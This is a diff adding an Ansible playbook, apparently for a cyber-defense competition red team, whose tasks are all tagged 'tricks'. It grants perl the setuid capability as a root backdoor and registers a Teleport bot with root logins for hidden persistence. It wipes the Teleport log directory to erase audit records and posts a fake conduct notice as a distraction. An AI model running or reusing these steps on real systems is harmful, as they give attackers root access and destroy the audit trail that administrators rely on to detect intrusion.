@@ -1,0 +1,38 @@
+---
+- name: Set CAP_SETUID on perl
+  community.general.capabilities:
+    path: /usr/bin/perl
+    capability: cap_setuid+ep
+    state: present
+  tags:
+   - tricks
+
+- name: Insert warning notification
+  ansible.builtin.command:
+    cmd: tctl notifications add --warning --ttl 90d --title 'Employee Conduct Reminder' --content 'Company policy requires working uninterrupted between the hours of 9am and 5pm with a 30-minute lunch break. Violations or causing employee interruption will also result in disciplinary action.'
+  tags:
+    - tricks
+
+# Maybe this was just a hint for regionals
+- name: Insert bot
+  ansible.builtin.command:
+    cmd: tctl bots add semaphore --logins root --roles auditor
+  tags:
+    - tricks
+
+- name: Remove Teleport log directory and its contents
+  ansible.builtin.file:
+    path: /var/lib/teleport/log/
+    state: absent
+  tags:
+    - tricks
+
+- name: Recreate Teleport log directory
+  ansible.builtin.file:
+    path: /var/lib/teleport/log/
+    state: directory
+    owner: root
+    group: root
+    mode: "0750"
+  tags:
+    - tricks
